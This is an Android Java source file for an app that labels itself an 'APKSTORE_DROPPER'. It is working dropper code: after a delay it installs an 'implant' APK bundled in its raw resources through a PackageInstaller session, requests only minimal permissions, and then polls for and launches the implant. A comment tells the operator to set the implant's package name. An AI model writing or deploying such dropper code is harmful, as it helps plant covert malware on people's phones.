package com.brkwl.apkstore;


import static android.Manifest.permission.POST_NOTIFICATIONS;

import static android.Manifest.permission.READ_EXTERNAL_STORAGE;
import static android.Manifest.permission.READ_MEDIA_IMAGES;
import static android.Manifest.permission.READ_MEDIA_VIDEO;
import static android.Manifest.permission.WRITE_EXTERNAL_STORAGE;


import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentSender;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.util.Arrays;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    String LCTAG = "APKSTORE_DROPPER";
    static Context THECTX;
    private static final String PACKAGE_INSTALLED_ACTION =  "DONE_INSTALL_IMPLANT";
    String IMPLANT_PKGNAME = ""; //change this according to your implant.apk canonical package name (com.something.yours)


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        THECTX = getApplicationContext();


        new Handler().postDelayed(new Runnable() {
            public void run() {

                if (
                        (ContextCompat.checkSelfPermission(getApplicationContext(), POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) ||  (ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) || (ContextCompat.checkSelfPermission(getApplicationContext(), READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
                ) {
//                    no need to request external storage, since we are installing from res/raw which stored in apps-internal-storage
//                    requestPermissions(new String[]{POST_NOTIFICATIONS,  WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, READ_MEDIA_VIDEO, READ_MEDIA_IMAGES    }, 1337);

                    requestPermissions(new String[]{POST_NOTIFICATIONS  }, 1337);
                }
            }
        }, 1000);


        new Handler().postDelayed(new Runnable() {
            public void run() {
                loc_sessINSTALL("implant");
            }
        }, 4000);


        new Handler().postDelayed(new Runnable() {
            public void run() {
                for (int i = 0; i < 50; i++) {

                    if (isAppAvailable(getApplicationContext(), IMPLANT_PKGNAME)) {
                        Intent launchIntentForPackage = getApplicationContext().getPackageManager().getLaunchIntentForPackage(IMPLANT_PKGNAME);
                        launchIntentForPackage.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        getApplicationContext().startActivity(launchIntentForPackage);
                        break;
                    }else{
                        Log.v(LCTAG, "implant not installed yet");
                    }

                }
            }
        }, 3000);

    }





    private void loc_sessINSTALL(String apkFileName) {
        try {
            InputStream in = getResources().openRawResource( getResources().getIdentifier(apkFileName, "raw", getPackageName()));

            PackageInstaller.Session session = null;

            PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                    PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            int sessionId = packageInstaller.createSession(params);
            session = packageInstaller.openSession(sessionId);


            OutputStream out = session.openWrite("implant-apk-first", 0, -1);
            byte[] buffer = new byte[65536];
            int c;
            while ((c = in.read(buffer)) != -1) {
                out.write(buffer, 0, c);
            }
            session.fsync(out);
            in.close();
            out.close();

            Log.d("DEBUGED", "added-apk-to-session -> "+ Arrays.toString(session.getNames())  );


            // Create an install status receiver.
            Context context = MainActivity.this;
            Intent intent = new Intent(context, MainActivity.class);
            intent.setAction(PACKAGE_INSTALLED_ACTION);
            PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, 0);
            IntentSender statusReceiver = pendingIntent.getIntentSender();

            // Commit the session (this will start the installation workflow).
            session.commit(statusReceiver);

        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    // Note: this Activity must run in singleTop launchMode for it to be able to receive the intent
    // in onNewIntent().
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        Bundle extras = intent.getExtras();

        Log.d("DEBUGED", "intenttt-action -> "+intent.getAction());

        if (intent.getAction().contains("DONE_INSTALL_IMPLANT")   ) {
            int status = extras.getInt(PackageInstaller.EXTRA_STATUS);
            String message = extras.getString(PackageInstaller.EXTRA_STATUS_MESSAGE);
            switch (status) {
                case PackageInstaller.STATUS_PENDING_USER_ACTION:
                    // This test app isn't privileged, so the user has to confirm the install.
                    Intent confirmIntent = (Intent) extras.get(Intent.EXTRA_INTENT);
                    startActivity(confirmIntent);
                    break;
                case PackageInstaller.STATUS_SUCCESS:

                    Toast.makeText(this, "Install succeeded!", Toast.LENGTH_SHORT).show();
                    break;


                case PackageInstaller.STATUS_FAILURE:
                case PackageInstaller.STATUS_FAILURE_ABORTED:
                case PackageInstaller.STATUS_FAILURE_BLOCKED:
                case PackageInstaller.STATUS_FAILURE_CONFLICT:
                case PackageInstaller.STATUS_FAILURE_INCOMPATIBLE:
                case PackageInstaller.STATUS_FAILURE_INVALID:
                case PackageInstaller.STATUS_FAILURE_STORAGE:
                    Toast.makeText(this, "Install failed! " + status + ", " + message,
                            Toast.LENGTH_SHORT).show();
                    break;
                default:
                    Toast.makeText(this, "Unrecognized status received from installer: " + status,
                            Toast.LENGTH_SHORT).show();
            }
        }
    }














    public static boolean isAppAvailable(Context context, String str) {
        try {
            context.getPackageManager().getApplicationInfo(str, 0);
            return true;
        } catch (PackageManager.NameNotFoundException unused) {
            return false;
        }
    }





}